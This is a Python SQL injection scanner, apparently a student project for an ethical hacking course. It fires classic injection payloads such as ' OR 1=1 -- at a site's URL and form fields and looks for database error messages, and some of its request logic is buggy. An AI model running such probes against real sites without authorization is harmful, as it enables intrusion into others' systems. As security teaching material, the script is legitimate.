import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
import itertools


# initialize an HTTP session & set the browser
s = requests.Session()
s.headers["User Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHMTL, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

vulnerable_urls = []  # List to store vulnerable URLs


def get_all_forms(url):
    """Given a 'url', it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML 'form'
    """
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    """
    A simple boolean function that determines whether a page is
    SQL Injection vulnerable from its 'response'
    """
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True

    return False


def scan_sql_injection(url):
    payloads = ["'", "\"", "--", "#", " OR 1=1 --", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
    all_payloads = list(itertools.product(payloads, repeat=2))

    for c in "\"'":
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        res = s.get(new_url)
        if is_vulnerable(res):
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            vulnerable_urls.append(new_url)
        forms = get_all_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        for form in forms:
            form_details = get_form_details(form)
            for payload in all_payloads:
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        try:
                            data[input_tag["name"]] = input_tag["value"] + payload[0]
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = payload[1]
                url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = s.get(url, params=data)
                if is_vulnerable(res):
                    print("[+] SQL Injection vulnerability detected, link:", url)
                    print("[+] form:")
                    pprint(form_details)
                    vulnerable_urls.append(url)
                    break


if __name__ == "__main__":
    print("[+]Created By: Lumene Caleb \n[+]Student Number: 1902******\n[+]Course: Ethical Hacking ")
    print("[+]Lecturers: Eng Mwashi, Eng Simata\n[+]Project title: SqlScanner")
    print("[+]Email: reconface7@gmail.com")

    url = input("Enter the site URL to scan: ")
    scan_sql_injection(url)

    # Print the list of vulnerable URLs
    print("\n--- Vulnerable URLs ---")
    for vuln_url in vulnerable_urls:
        print(vuln_url)
